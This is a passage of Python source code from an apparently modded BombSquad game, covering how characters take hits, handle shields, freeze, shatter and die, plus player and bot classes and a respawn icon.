                self.hitPoints = self.hitPointsMax
                self._flashBillboard(bs.Powerup.getFactory().texHealth)
                self.node.hurt = 0
                self._lastHitTime = None
                self._numTimesHit = 0
                
            self.node.handleMessage("flash")
            if msg.sourceNode.exists():
                msg.sourceNode.handleMessage(bs.PowerupAcceptMessage())
            return True

        elif isinstance(msg, bs.FreezeMessage):
            if not self.node.exists(): return
            if self.node.invincible == True:
                bs.playSound(self.getFactory().blockSound, 1.0,
                             position=self.node.position)
                return
            if self.shield is not None: return
            if not self.frozen:
                self.frozen = True
                self.node.frozen = 1
                bs.gameTimer(5000, bs.WeakCall(self.handleMessage,
                                               bs.ThawMessage()))
                # instantly shatter if we're already dead
                # (otherwise its hard to tell we're dead)
                if self.hitPoints <= 0:
                    self.shatter()

        elif isinstance(msg, bs.ThawMessage):
            if self.frozen and not self.shattered and self.node.exists():
                self.frozen = False
                self.node.frozen = 0
                
        elif isinstance(msg, bs.HitMessage):
            if not self.node.exists(): return
            if self.node.invincible == True:
                bs.playSound(self.getFactory().blockSound,
                             1.0, position=self.node.position)
                return True

            # if we were recently hit, don't count this as another
            # (so punch flurries and bomb pileups essentially count as 1 hit)
            gameTime = bs.getGameTime()
            if self._lastHitTime is None or gameTime-self._lastHitTime > 1000:
                self._numTimesHit += 1
                self._lastHitTime = gameTime
            
            mag = msg.magnitude * self._impactScale
            velocityMag = msg.velocityMagnitude * self._impactScale

            damageScale = 0.22

            # if they've got a shield, deliver it to that instead..
            if self.shield is not None:

                if msg.flatDamage: damage = msg.flatDamage * self._impactScale
                else:
                    # hit our spaz with an impulse but tell it to only return
                    # theoretical damage; not apply the impulse..
                    self.node.handleMessage(
                        "impulse", msg.pos[0], msg.pos[1], msg.pos[2],
                        msg.velocity[0], msg.velocity[1], msg.velocity[2],
                        mag , velocityMag, msg.radius, 1,
                        msg.forceDirection[0], msg.forceDirection[1],
                        msg.forceDirection[2])
                    damage = damageScale * self.node.damage

                self.shieldHitPoints -= damage

                self.shield.hurt = (1.0 - float(self.shieldHitPoints)
                                    /self.shieldHitPointsMax)
                # its a cleaner event if a hit just kills the shield
                # without damaging the player..
                # however, massive damage events should still be able to
                # damage the player.. this hopefully gives us a happy medium.
                maxSpillover = self.getFactory().maxShieldSpilloverDamage
                if self.shieldHitPoints <= 0:
                    # fixme - transition out perhaps?..
                    self.shield.delete()
                    self.shield = None
                    bs.playSound(self.getFactory().shieldDownSound, 1.0,
                                 position=self.node.position)
                    # emit some cool lookin sparks when the shield dies
                    t = self.node.position
                    bs.emitBGDynamics(position=(t[0], t[1]+0.9, t[2]),
                                      velocity=self.node.velocity,
                                      count=random.randrange(20, 30), scale=1.0,
                                      spread=0.6, chunkType='spark')

                else:
                    bs.playSound(self.getFactory().shieldHitSound, 0.5,
                                 position=self.node.position)

                # emit some cool lookin sparks on shield hit
                bs.emitBGDynamics(position=msg.pos,
                                  velocity=(msg.forceDirection[0]*1.0,
                                            msg.forceDirection[1]*1.0,
                                            msg.forceDirection[2]*1.0),
                                  count=min(30, 5+int(damage*0.005)),
                                  scale=0.5, spread=0.3, chunkType='spark')

                # if they passed our spillover threshold,
                # pass damage along to spaz
                if self.shieldHitPoints <= -maxSpillover:
                    leftoverDamage = -maxSpillover-self.shieldHitPoints
                    shieldLeftoverRatio = leftoverDamage/damage

                    # scale down the magnitudes applied to spaz accordingly..
                    mag *= shieldLeftoverRatio
                    velocityMag *= shieldLeftoverRatio
                else:
                    return True # good job shield!
            else: shieldLeftoverRatio = 1.0

            if msg.flatDamage:
                damage = (msg.flatDamage * self._impactScale
                          * shieldLeftoverRatio)
            else:
                # hit it with an impulse and get the resulting damage
                self.node.handleMessage(
                    "impulse", msg.pos[0], msg.pos[1], msg.pos[2],
                    msg.velocity[0], msg.velocity[1], msg.velocity[2],
                    mag, velocityMag, msg.radius, 0,
                    msg.forceDirection[0], msg.forceDirection[1],
                    msg.forceDirection[2])

                damage = damageScale * self.node.damage
            self.node.handleMessage("hurtSound")

            # play punch impact sound based on damage if it was a punch
            if msg.hitType == 'punch':

                self.onPunched(damage)

                # if damage was significant, lets show it
                if damage > 350:
                    bsUtils.showDamageCount('-' + str(int(damage/10)) + "%",
                                            msg.pos, msg.forceDirection)
                                               
                # lets always add in a super-punch sound with boxing
                # gloves just to differentiate them
                if msg.hitSubType == 'superPunch':
                    bs.playSound(self.getFactory().punchSoundStronger, 1.0,
                                 position=self.node.position)
                if damage > 500:
                    sounds = self.getFactory().punchSoundsStrong
                    sound = sounds[random.randrange(len(sounds))]
                else: sound = self.getFactory().punchSound
                bs.playSound(sound, 1.0, position=self.node.position)

                # throw up some chunks
                bs.emitBGDynamics(position=msg.pos,
                                  velocity=(msg.forceDirection[0]*0.5,
                                            msg.forceDirection[1]*0.5,
                                            msg.forceDirection[2]*0.5),
                                  count=min(10, 1+int(damage*0.0025)),
                                  scale=0.3, spread=0.03);

                bs.emitBGDynamics(position=msg.pos,
                                  chunkType='sweat',
                                  velocity=(msg.forceDirection[0]*1.3,
                                            msg.forceDirection[1]*1.3+5.0,
                                            msg.forceDirection[2]*1.3),
                                  count=min(30, 1+int(damage*0.04)),
                                  scale=0.9,
                                  spread=0.28);
                # momentary flash
                hurtiness = damage*0.003
                punchPos = (msg.pos[0]+msg.forceDirection[0]*0.02,
                            msg.pos[1]+msg.forceDirection[1]*0.02,
                            msg.pos[2]+msg.forceDirection[2]*0.02)
                flashColor = (1.0, 0.8, 0.4)
                light = bs.newNode("light",
                                   attrs={'position':punchPos,
                                          'radius':0.12+hurtiness*0.12,
                                          'intensity':0.3*(1.0+1.0*hurtiness),
                                          'heightAttenuated':False,
                                          'color':flashColor})
                bs.gameTimer(60, light.delete)


                flash = bs.newNode("flash",
                                   attrs={'position':punchPos,
                                          'size':0.17+0.17*hurtiness,
                                          'color':flashColor})
                bs.gameTimer(60, flash.delete)

            if msg.hitType == 'impact':
                bs.emitBGDynamics(position=msg.pos,
                                  velocity=(msg.forceDirection[0]*2.0,
                                            msg.forceDirection[1]*2.0,
                                            msg.forceDirection[2]*2.0),
                                  count=min(10, 1+int(damage*0.01)),
                                  scale=0.4, spread=0.1);
            if self.hitPoints > 0:
                # its kinda crappy to die from impacts, so lets reduce
                # impact damage by a reasonable amount if it'll keep us alive
                if msg.hitType == 'impact' and damage > self.hitPoints:
                    # drop damage to whatever puts us at 10 hit points,
                    # or 200 less than it used to be whichever is greater
                    # (so it *can* still kill us if its high enough)
                    newDamage = max(damage-200, self.hitPoints-10)
                    damage = newDamage
                self.node.handleMessage("flash")
                # if we're holding something, drop it
                if damage > 0.0 and self.node.holdNode.exists():
                    self.node.holdNode = bs.Node(None)
                self.hitPoints -= damage
                self.node.hurt = 1.0 - float(self.hitPoints)/self.hitPointsMax
                # if we're cursed, *any* damage blows us up
                if self._cursed and damage > 0:
                    bs.gameTimer(50, bs.WeakCall(self.curseExplode,
                                                 msg.sourcePlayer))
                # if we're frozen, shatter.. otherwise die if we hit zero
                if self.frozen and (damage > 200 or self.hitPoints <= 0):
                    self.shatter()
                elif self.hitPoints <= 0:
                    self.node.handleMessage(bs.DieMessage(how='impact'))

            # if we're dead, take a look at the smoothed damage val
            # (which gives us a smoothed average of recent damage) and shatter
            # us if its grown high enough
            if self.hitPoints <= 0:
                damageAvg = self.node.damageSmoothed * damageScale
                if damageAvg > 1000:
                    self.shatter()

        elif isinstance(msg, _BombDiedMessage):
            self.bombCount += 1
        
        elif isinstance(msg, bs.DieMessage):
            wasDead = self._dead
            self._dead = True
            self.hitPoints = 0
            if msg.immediate:
                self.node.delete()
            elif self.node.exists():
                self.node.hurt = 1.0
                if self.playBigDeathSound and not wasDead:
                    bs.playSound(self.getFactory().singlePlayerDeathSound)
                self.node.dead = True
                bs.gameTimer(2000, self.node.delete)

        elif isinstance(msg, bs.OutOfBoundsMessage):
            # by default we just die here
            self.handleMessage(bs.DieMessage(how='fall'))
        elif isinstance(msg, bs.StandMessage):
            self._lastStandPos = (msg.position[0], msg.position[1],
                                  msg.position[2])
            self.node.handleMessage("stand", msg.position[0], msg.position[1],
                                    msg.position[2], msg.angle)
        elif isinstance(msg, _CurseExplodeMessage):
            self.curseExplode()
        elif isinstance(msg, _PunchHitMessage):
            node = bs.getCollisionInfo("opposingNode")

            # only allow one hit per node per punch
            if (node is not None and node.exists()
                and not node in self._punchedNodes):
                
                punchMomentumAngular = (self.node.punchMomentumAngular
                                        * self._punchPowerScale)
                punchPower = self.node.punchPower * self._punchPowerScale

                # ok here's the deal:  we pass along our base velocity for use
                # in the impulse damage calculations since that is a more
                # predictable value than our fist velocity, which is rather
                # erratic. ...however we want to actually apply force in the
                # direction our fist is moving so it looks better.. so we still
                # pass that along as a direction ..perhaps a time-averaged
                # fist-velocity would work too?.. should try that.
                
                # if its something besides another spaz, just do a muffled punch
                # sound
                if node.getNodeType() != 'spaz':
                    sounds = self.getFactory().impactSoundsMedium
                    sound = sounds[random.randrange(len(sounds))]
                    bs.playSound(sound, 1.0, position=self.node.position)

                t = self.node.punchPosition
                punchDir = self.node.punchVelocity
                v = self.node.punchMomentumLinear

                self._punchedNodes.add(node)
                node.handleMessage(
                    bs.HitMessage(
                        pos=t,
                        velocity=v,
                        magnitude=punchPower*punchMomentumAngular*110.0,
                        velocityMagnitude=punchPower*40,
                        radius=0,
                        srcNode=self.node,
                        sourcePlayer=self.sourcePlayer,
                        forceDirection = punchDir,
                        hitType='punch',
                        hitSubType=('superPunch' if self._hasBoxingGloves
                                    else 'default')))

                # also apply opposite to ourself for the first punch only
                # ..this is given as a constant force so that it is more
                # noticable for slower punches where it matters.. for fast
                # awesome looking punches its ok if we punch 'through'
                # the target
                mag = -400.0
                if self._hockey: mag *= 0.5
                if len(self._punchedNodes) == 1:
                    self.node.handleMessage("kickBack", t[0], t[1], t[2],
                                            punchDir[0], punchDir[1],
                                            punchDir[2], mag)

        elif isinstance(msg, _PickupMessage):
            opposingNode, opposingBody = bs.getCollisionInfo('opposingNode',
                                                            'opposingBody')

            if opposingNode is None or not opposingNode.exists(): return True

            # dont allow picking up of invincible dudes
            try:
                if opposingNode.invincible == True: return True
            except Exception: pass

            # if we're grabbing the pelvis of a non-shattered spaz, we wanna
            # grab the torso instead
            if (opposingNode.getNodeType() == 'spaz'
                and not opposingNode.shattered and opposingBody == 4):
                opposingBody = 1

            # special case - if we're holding a flag, dont replace it
            # ( hmm - should make this customizable or more low level )
            held = self.node.holdNode
            if (held is not None and held.exists()
                and held.getNodeType() == 'flag'): return True
            self.node.holdBody = opposingBody # needs to be set before holdNode
            self.node.holdNode = opposingNode
        else:
            bs.Actor.handleMessage(self, msg)

    def dropBomb(self):
        """
        Tell the spaz to drop one of his bombs, and returns
        the resulting bomb object.
        If the spaz has no bombs or is otherwise unable to
        drop a bomb, returns None.
        """

        if (self.landMineCount <= 0 and self.bombCount <= 0) or self.frozen:
            return
        p = self.node.positionForward
        v = self.node.velocity

        if self.landMineCount > 0:
            droppingBomb = False
            self.setLandMineCount(self.landMineCount-1)
            bombType = 'landMine'
        else:
            droppingBomb = True
            bombType = self.bombType

        bomb = bs.Bomb(position=(p[0], p[1] - 0.0, p[2]),
                       velocity=(v[0], v[1], v[2]),
                       bombType=bombType,
                       blastRadius=self.blastRadius,
                       sourcePlayer=self.sourcePlayer,
                       owner=self.node).autoRetain()

        if droppingBomb:
            self.bombCount -= 1
            bomb.node.addDeathAction(bs.WeakCall(self.handleMessage,
                                                 _BombDiedMessage()))
        self._pickUp(bomb.node)

        for c in self._droppedBombCallbacks: c(self, bomb)
        
        return bomb

    def _pickUp(self, node):
        if self.node.exists() and node.exists():
            self.node.holdBody = 0 # needs to be set before holdNode
            self.node.holdNode = node
        
    def setLandMineCount(self, count):
        """
        Set the number of land-mines this spaz is carrying.
        """
        self.landMineCount = count
        if self.node.exists():
            if self.landMineCount != 0:
                self.node.counterText = 'x'+str(self.landMineCount)
                self.node.counterTexture = bs.Powerup.getFactory().texLandMines
            else:
                self.node.counterText = ''

    def curseExplode(self, sourcePlayer=None):
        """
        Explode the poor spaz as happens when
        a curse timer runs out.
        """

        # convert None to an empty player-ref
        if sourcePlayer is None: sourcePlayer = bs.Player(None)
        
        if self._cursed and self.node.exists():
            self.shatter(extreme=True)
            self.handleMessage(bs.DieMessage())
            activity = self._activity()
            if activity:
                bs.Blast(position=self.node.position,
                         velocity=self.node.velocity,
                         blastRadius=3.0, blastType='normal',
                         sourcePlayer=(sourcePlayer if sourcePlayer.exists()
                                       else self.sourcePlayer)).autoRetain()
            self._cursed = False

    def shatter(self, extreme=False):
        """
        Break the poor spaz into little bits.
        """
        if self.shattered: return
        self.shattered = True
        if self.frozen:
            # momentary flash of light
            light = bs.newNode('light',
                               attrs={'position':self.node.position,
                                      'radius':0.5,
                                      'heightAttenuated':False,
                                      'color': (0.8, 0.8, 1.0)})
            
            bs.animate(light, 'intensity', {0:3.0, 40:0.5, 80:0.07, 300:0})
            bs.gameTimer(300, light.delete)
            # emit ice chunks..
            bs.emitBGDynamics(position=self.node.position,
                              velocity=self.node.velocity,
                              count=int(random.random()*10.0+10.0),
                              scale=0.6, spread=0.2, chunkType='ice');
            bs.emitBGDynamics(position=self.node.position,
                              velocity=self.node.velocity,
                              count=int(random.random()*10.0+10.0),
                              scale=0.3, spread=0.2, chunkType='ice');

            bs.playSound(self.getFactory().shatterSound, 1.0,
                         position=self.node.position)
        else:
            bs.playSound(self.getFactory().splatterSound, 1.0,
                         position=self.node.position)
        self.handleMessage(bs.DieMessage())
        self.node.shattered = 2 if extreme else 1

    def _hitSelf(self, intensity):

        # clean exit if we're dead..
        try: pos = self.node.position
        except Exception: return

        self.handleMessage(bs.HitMessage(flatDamage=50.0*intensity,
                                         pos=pos,
                                         forceDirection=self.node.velocity,
                                         hitType='impact'))
        self.node.handleMessage("knockout", max(0.0, 50.0*intensity))
        if intensity > 5: sounds = self.getFactory().impactSoundsHarder
        elif intensity > 3: sounds = self.getFactory().impactSoundsHard
        else: sounds = self.getFactory().impactSoundsMedium
        s = sounds[random.randrange(len(sounds))]
        bs.playSound(s, position=pos, volume=5.0)
        
    def _getBombTypeTex(self):
        bombFactory = bs.Powerup.getFactory()
        if self.bombType == 'sticky': return bombFactory.texStickyBombs
        elif self.bombType == 'ice': return bombFactory.texIceBombs
        elif self.bombType == 'impact': return bombFactory.texImpactBombs
        else: raise Exception()
        
    def _flashBillboard(self, tex):
        self.node.billboardTexture = tex
        self.node.billboardCrossOut = False
        bs.animate(self.node, "billboardOpacity",
                   {0:0.0, 100:1.0, 400:1.0, 500:0.0})

    def setBombCount(self, count):
        'Sets the number of bombs this Spaz has.'
        # we cant just set bombCount cuz some bombs may be laid currently
        # so we have to do a relative diff based on max
        diff = count - self._maxBombCount
        self._maxBombCount += diff
        self.bombCount += diff

    def _glovesWearOffFlash(self):
        if self.node.exists():
            self.node.boxingGlovesFlashing = 1
            self.node.billboardTexture = bs.Powerup.getFactory().texPunch
            self.node.billboardOpacity = 1.0
            self.node.billboardCrossOut = True

    def _glovesWearOff(self):
        if self._demoMode: # preserve old behavior
            self._punchPowerScale = gBasePunchPowerScale
            self._punchCooldown = gBasePunchCooldown
        else:
            factory = self.getFactory()
            self._punchPowerScale = factory.punchPowerScale
            self._punchCooldown = factory.punchCooldown
        self._hasBoxingGloves = False
        if self.node.exists():
            bs.playSound(bs.Powerup.getFactory().powerdownSound,
                         position=self.node.position)
            self.node.boxingGloves = 0
            self.node.billboardOpacity = 0.0

    def _multiBombWearOffFlash(self):
        if self.node.exists():
            self.node.billboardTexture = bs.Powerup.getFactory().texBomb
            self.node.billboardOpacity = 1.0
            self.node.billboardCrossOut = True

    def _multiBombWearOff(self):
        self.setBombCount(self.defaultBombCount)
        if self.node.exists():
            bs.playSound(bs.Powerup.getFactory().powerdownSound,
                         position=self.node.position)
            self.node.billboardOpacity = 0.0

    def _bombWearOffFlash(self):
        if self.node.exists():
            self.node.billboardTexture = self._getBombTypeTex()
            self.node.billboardOpacity = 1.0
            self.node.billboardCrossOut = True

    def _bombWearOff(self):
        self.bombType = self.bombTypeDefault
        if self.node.exists():
            bs.playSound(bs.Powerup.getFactory().powerdownSound,
                         position=self.node.position)
            self.node.billboardOpacity = 0.0


class PlayerSpazDeathMessage(object):
    """
    category: Message Classes

    A bs.PlayerSpaz has died.

    Attributes:

       spaz
          The bs.PlayerSpaz that died.

       killed
          If True, the spaz was killed;
          If False, they left the game or the round ended.

       killerPlayer
          The bs.Player that did the killing, or None.

       how
          The particular type of death.
    """
    def __init__(self, spaz, wasKilled, killerPlayer, how):
        """
        Instantiate a message with the given values.
        """
        self.spaz = spaz
        self.killed = wasKilled
        self.killerPlayer = killerPlayer
        self.how = how

class PlayerSpazHurtMessage(object):
    """
    category: Message Classes

    A bs.PlayerSpaz was hurt.

    Attributes:

       spaz
          The bs.PlayerSpaz that was hurt
    """
    def __init__(self, spaz):
        """
        Instantiate with the given bs.Spaz value.
        """
        self.spaz = spaz


class PlayerSpaz(Spaz):
    """
    category: Game Flow Classes
    
    A bs.Spaz subclass meant to be controlled by a bs.Player.

    When a PlayerSpaz dies, it delivers a bs.PlayerSpazDeathMessage
    to the current bs.Activity. (unless the death was the result of the
    player leaving the game, in which case no message is sent)

    When a PlayerSpaz is hurt, it delivers a bs.PlayerSpazHurtMessage
    to the current bs.Activity.
    """


    def __init__(self, color=(1, 1, 1), highlight=(0.5, 0.5, 0.5),
                 character="Spaz", player=None, powerupsExpire=True):
        """
        Create a spaz for the provided bs.Player.
        Note: this does not wire up any controls;
        you must call connectControlsToPlayer() to do so.
        """
        # convert None to an empty player-ref
        if player is None: player = bs.Player(None)
        
        Spaz.__init__(self, color=color, highlight=highlight,
                      character=character, sourcePlayer=player,
                      startInvincible=True, powerupsExpire=powerupsExpire)
        self.lastPlayerAttackedBy = None # FIXME - should use empty player ref
        self.lastAttackedTime = 0
        self.lastAttackedType = None
        self.heldCount = 0
        self.lastPlayerHeldBy = None # FIXME - should use empty player ref here
        self._player = player

        # grab the node for this player and wire it to follow our spaz
        # (so players' controllers know where to draw their guides, etc)
        if player.exists():
            playerNode = bs.getActivity()._getPlayerNode(player)
            self.node.connectAttr('torsoPosition', playerNode, 'position')

    def __superHandleMessage(self, msg):
        super(PlayerSpaz, self).handleMessage(msg)
        
    def getPlayer(self):
        """
        Return the bs.Player associated with this spaz.
        Note that while a valid player object will always be
        returned, there is no guarantee that the player is still
        in the game.  Call bs.Player.exists() on the return value
        before doing anything with it.
        """
        return self._player

    def connectControlsToPlayer(self, enableJump=True, enablePunch=True,
                                enablePickUp=True, enableBomb=True,
                                enableRun=True, enableFly=True):
        """
        Wire this spaz up to the provided bs.Player.
        Full control of the character is given by default
        but can be selectively limited by passing False
        to specific arguments.
        """
        player = self.getPlayer()
        
        # reset any currently connected player and/or the player we're wiring up
        if self._connectedToPlayer is not None:
            if player != self._connectedToPlayer: player.resetInput()
            self.disconnectControlsFromPlayer()
        else: player.resetInput()

        player.assignInputCall('upDown', self.onMoveUpDown)
        player.assignInputCall('leftRight', self.onMoveLeftRight)
        player.assignInputCall('holdPositionPress', self._onHoldPositionPress)
        player.assignInputCall('holdPositionRelease',
                               self._onHoldPositionRelease)

        if enableJump:
            player.assignInputCall('jumpPress', self.onJumpPress)
            player.assignInputCall('jumpRelease', self.onJumpRelease)
        if enablePickUp:
            player.assignInputCall('pickUpPress', self.onPickUpPress)
            player.assignInputCall('pickUpRelease', self.onPickUpRelease)
        if enablePunch:
            player.assignInputCall('punchPress', self.onPunchPress)
            player.assignInputCall('punchRelease', self.onPunchRelease)
        if enableBomb:
            player.assignInputCall('bombPress', self.onBombPress)
            player.assignInputCall('bombRelease', self.onBombRelease)
        if enableRun:
            player.assignInputCall('run', self.onRun)
        if enableFly:
            player.assignInputCall('flyPress', self.onFlyPress)
            player.assignInputCall('flyRelease', self.onFlyRelease)

        self._connectedToPlayer = player

        
    def disconnectControlsFromPlayer(self):
        """
        Completely sever any previously connected
        bs.Player from control of this spaz.
        """
        if self._connectedToPlayer is not None:
            self._connectedToPlayer.resetInput()
            self._connectedToPlayer = None
            # send releases for anything in case its held..
            self.onMoveUpDown(0)
            self.onMoveLeftRight(0)
            self._onHoldPositionRelease()
            self.onJumpRelease()
            self.onPickUpRelease()
            self.onPunchRelease()
            self.onBombRelease()
            self.onRun(0.0)
            self.onFlyRelease()
        else:
            print ('WARNING: disconnectControlsFromPlayer() called for'
                   ' non-connected player')

    def handleMessage(self, msg):
        self._handleMessageSanityCheck()
        # keep track of if we're being held and by who most recently
        if isinstance(msg, bs.PickedUpMessage):
            self.__superHandleMessage(msg) # augment standard behavior
            self.heldCount += 1
            pickedUpBy = msg.node.sourcePlayer
            if pickedUpBy is not None and pickedUpBy.exists():
                self.lastPlayerHeldBy = pickedUpBy
        elif isinstance(msg, bs.DroppedMessage):
            self.__superHandleMessage(msg) # augment standard behavior
            self.heldCount -= 1
            if self.heldCount < 0:
                print "ERROR: spaz heldCount < 0"
            # let's count someone dropping us as an attack..
            try: pickedUpBy = msg.node.sourcePlayer
            except Exception: pickedUpBy = None
            if pickedUpBy is not None and pickedUpBy.exists():
                self.lastPlayerAttackedBy = pickedUpBy
                self.lastAttackedTime = bs.getGameTime()
                self.lastAttackedType = ('pickedUp', 'default')
        elif isinstance(msg, bs.DieMessage):

            # report player deaths to the game
            if not self._dead:

                # immediate-mode or left-game deaths don't count as 'kills'
                killed = (msg.immediate==False and msg.how!='leftGame')

                activity = self._activity()

                if not killed:
                    killerPlayer = None
                else:
                    # if this player was being held at the time of death,
                    # the holder is the killer
                    if (self.heldCount > 0
                            and self.lastPlayerHeldBy is not None
                            and self.lastPlayerHeldBy.exists()):
                        killerPlayer = self.lastPlayerHeldBy
                    else:
                        # otherwise, if they were attacked by someone in the
                        # last few seconds, that person's the killer..
                        # otherwise it was a suicide.
                        # FIXME - currently disabling suicides in Co-Op since
                        # all bot kills would register as suicides; need to
                        # change this from lastPlayerAttackedBy to something
                        # like lastActorAttackedBy to fix that.
                        if (self.lastPlayerAttackedBy is not None
                                and self.lastPlayerAttackedBy.exists()
                                and bs.getGameTime() - self.lastAttackedTime \
                                < 4000):
                            killerPlayer = self.lastPlayerAttackedBy
                        else:
                            # ok, call it a suicide unless we're in co-op
                            if (activity is not None
                                    and not isinstance(activity.getSession(),
                                                       bs.CoopSession)):
                                killerPlayer = self.getPlayer()
                            else:
                                killerPlayer = None
                            
                if killerPlayer is not None and not killerPlayer.exists():
                    killerPlayer = None

                # only report if both the player and the activity still exist
                if (killed and activity is not None
                    and self.getPlayer().exists()):
                    activity.handleMessage(
                        PlayerSpazDeathMessage(self, killed,
                                               killerPlayer, msg.how))
                    
            self.__superHandleMessage(msg) # augment standard behavior

        # keep track of the player who last hit us for point rewarding
        elif isinstance(msg, bs.HitMessage):
            if msg.sourcePlayer is not None and msg.sourcePlayer.exists():
                self.lastPlayerAttackedBy = msg.sourcePlayer
                self.lastAttackedTime = bs.getGameTime()
                self.lastAttackedType = (msg.hitType, msg.hitSubType)
            self.__superHandleMessage(msg) # augment standard behavior
            activity = self._activity()
            if activity is not None:
                activity.handleMessage(PlayerSpazHurtMessage(self))
        else:
            Spaz.handleMessage(self, msg)


class RespawnIcon(object):
    """
    category: Game Flow Classes

    An icon with a countdown that appears alongside the screen;
    used to indicate that a bs.Player is waiting to respawn.
    """
    
    def __init__(self, player, respawnTime):
        """
        Instantiate with a given bs.Player and respawnTime (in milliseconds)
        """
        activity = bs.getActivity()
        onRight = False
        self._visible = True
        if isinstance(bs.getSession(), bs.TeamsSession):
            onRight = player.getTeam().getID()%2==1
            # store a list of icons in the team
            try:
                respawnIcons = (player.getTeam()
                                .gameData['_spazRespawnIconsRight'])
            except Exception:
                respawnIcons = (player.getTeam()
                                .gameData['_spazRespawnIconsRight']) = {}
            offsExtra = -20
        else:
            onRight = False
            # store a list of icons in the activity
            try: respawnIcons = activity._spazRespawnIconsRight
            except Exception:
                respawnIcons = activity._spazRespawnIconsRight = {}
            if isinstance(activity.getSession(), bs.FreeForAllSession):
                offsExtra = -150
            else: offsExtra = -20

        try:
            maskTex = player.getTeam().gameData['_spazRespawnIconsMaskTex']
        except Exception:
            maskTex = player.getTeam().gameData['_spazRespawnIconsMaskTex'] = \
                bs.getTexture('characterIconMask')

        # now find the first unused slot and use that
        index = 0
        while (index in respawnIcons and respawnIcons[index]() is not None
               and respawnIcons[index]()._visible):
            index += 1
        respawnIcons[index] = weakref.ref(self)

        offs = offsExtra + index*-53
        icon = player.getIcon()
        texture = icon['texture']
        hOffs = -10
        self._image = bs.NodeActor(
            bs.newNode('image',
                       attrs={'texture':texture,
                              'tintTexture':icon['tintTexture'],
                              'tintColor':icon['tintColor'],
                              'tint2Color':icon['tint2Color'],
                              'maskTexture':maskTex,
                              'position':(-40-hOffs if onRight
                                          else 40+hOffs, -180+offs),
                              'scale':(32, 32),
                              'opacity':1.0,
                              'absoluteScale':True,
                              'attach':'topRight' if onRight else 'topLeft'}))
        
        bs.animate(self._image.node, 'opacity', {0:0, 200:0.7})
        
        text = bs.getTexture('replayIcon')
        self.p_image = bs.NodeActor(
            bs.newNode('image',
                       attrs={'texture':text,
                              'tintColor':(0,0,1),
                              'tint2Color':(0,0,1),
                              'position':(-75-hOffs if onRight
                                          else 75+hOffs, -180+offs),
                              'scale':(32, 32),
                              'opacity':1.0,
                              'absoluteScale':True,
                              'attach':'topRight' if onRight else 'topLeft'}))
        
        bs.animate(self.p_image.node, 'opacity', {0:0, 200:0.65})
        bsUtils.animate(self.p_image.node,'rotate',{90000:7000,1000:360},loop=True)
        #bsUtils.animateArray(self.p_image.node,'scale',2,{1200:(60,60),200:(73,73),0:(60,60)},loop=True)

        self._name = bs.NodeActor(
            bs.newNode('text',
                       attrs={'vAttach':'top',
                              'hAttach':'right' if onRight else 'left',
                              'text':bs.Lstr(value=player.getName()),
                              'maxWidth':100,
                              'hAlign':'center',
                              'vAlign':'center',
                              'shadow':1.0,
                              'flatness':1.0,
                              'color':bs.getSafeColor(icon['tintColor']),
                              'scale':0.5,
                              'position':(-40-hOffs if onRight
                                          else 40+hOffs, -205+49+offs)}))
        
        bs.animate(self._name.node, 'scale', {0:0, 100:0.5})

        self._text = bs.NodeActor(
            bs.newNode('text',
                       attrs={'position':(-67-hOffs if onRight
                                          else 67+hOffs, -194+offs),
                              'hAttach':'right' if onRight else 'left',
                              'hAlign':'right' if onRight else 'left',
                              'scale':0.9,
                              'shadow':0.5,
                              'flatness':0.5,
                              'vAttach':'top',
                              'color':bs.getSafeColor(icon['tintColor']),
                              'text':''}))
        
        bs.animate(self._text.node, 'scale', {0:0, 100:1.0})

        self._respawnTime = bs.getGameTime()+respawnTime
        self._update()
        self._timer = bs.Timer(1000, bs.WeakCall(self._update), repeat=True)

    def _update(self):
        remaining = int(round(self._respawnTime-bs.getGameTime())/1000.0)
        if remaining > 0:
            if self._text.node.exists():
                self._text.node.text = str(remaining)
        else: self._clear()
            
    def _clear(self):
        self._visible = False
        self._image = self._text = self._timer = self._name = self.p_image = None
        


class SpazBotPunchedMessage(object):
    """
    category: Message Classes

    A bs.SpazBot got punched.

    Attributes:

       badGuy
          The bs.SpazBot that got punched.

       damage
          How much damage was done to the bs.SpazBot.
    """
    
    def __init__(self, badGuy, damage):
        """
        Instantiate a message with the given values.
        """
        self.badGuy = badGuy
        self.damage = damage

class SpazBotDeathMessage(object):
    """
    category: Message Classes

    A bs.SpazBot has died.

    Attributes:

       badGuy
          The bs.SpazBot that was killed.

       killerPlayer
          The bs.Player that killed it (or None).

       how
          The particular type of death.
    """
    
    def __init__(self, badGuy, killerPlayer, how):
        """
        Instantiate with given values.
        """
        self.badGuy = badGuy
        self.killerPlayer = killerPlayer
        self.how = how

        
class SpazBot(Spaz):
    """
    category: Bot Classes

    A really dumb AI version of bs.Spaz.
    Add these to a bs.BotSet to use them.

    Note: currently the AI has no real ability to
    navigate obstacles and so should only be used
    on wide-open maps.

    When a SpazBot is killed, it delivers a bs.SpazBotDeathMessage
    to the current activity.

    When a SpazBot is punched, it delivers a bs.SpazBotPunchedMessage
    to the current activity.
    """

    character = 'Spaz'
    punchiness = 0.5
    throwiness = 0.7
    static = False
    bouncy = False
    run = False
    chargeDistMin = 0.0 # when we can start a new charge
    chargeDistMax = 2.0 # when we can start a new charge
    runDistMin = 0.0 # how close we can be to continue running
    chargeSpeedMin = 0.4
    chargeSpeedMax = 1.0
    throwDistMin = 5.0
    throwDistMax = 9.0
    throwRate = 1.0
    defaultBombType = 'normal'
    defaultBombCount = 3
    startCursed = False
    color=gDefaultBotColor
    highlight=gDefaultBotHighlight

    def __init__(self):
        """
        Instantiate a spaz-bot.
        """
        Spaz.__init__(self, color=self.color, highlight=self.highlight,
                      character=self.character, sourcePlayer=None,
                      startInvincible=False, canAcceptPowerups=False)

        # if you need to add custom behavior to a bot, set this to a callable
        # which takes one arg (the bot) and returns False if the bot's normal
        # update should be run and True if not
        self.updateCallback = None
        self._map = weakref.ref(bs.getActivity().getMap())

        self.lastPlayerAttackedBy = None # FIXME - should use empty player-refs
        self.lastAttackedTime = 0
        self.lastAttackedType = None
        self.targetPointDefault = None
        self.heldCount = 0
        self.lastPlayerHeldBy = None # FIXME - should use empty player-refs here
        self.targetFlag = None
        self._chargeSpeed = 0.5*(self.chargeSpeedMin+self.chargeSpeedMax)
        self._leadAmount = 0.5
        self._mode = 'wait'
        self._chargeClosingIn = False
        self._lastChargeDist = 0.0
        self._running = False
        self._lastJumpTime = 0

        # these cooldowns didnt exist when these bots were calibrated,
        # so take them out of the equation
        self._jumpCooldown = 0
        self._pickupCooldown = 0
        self._flyCooldown = 0
        self._bombCooldown = 0

        if self.startCursed: self.curse()
            
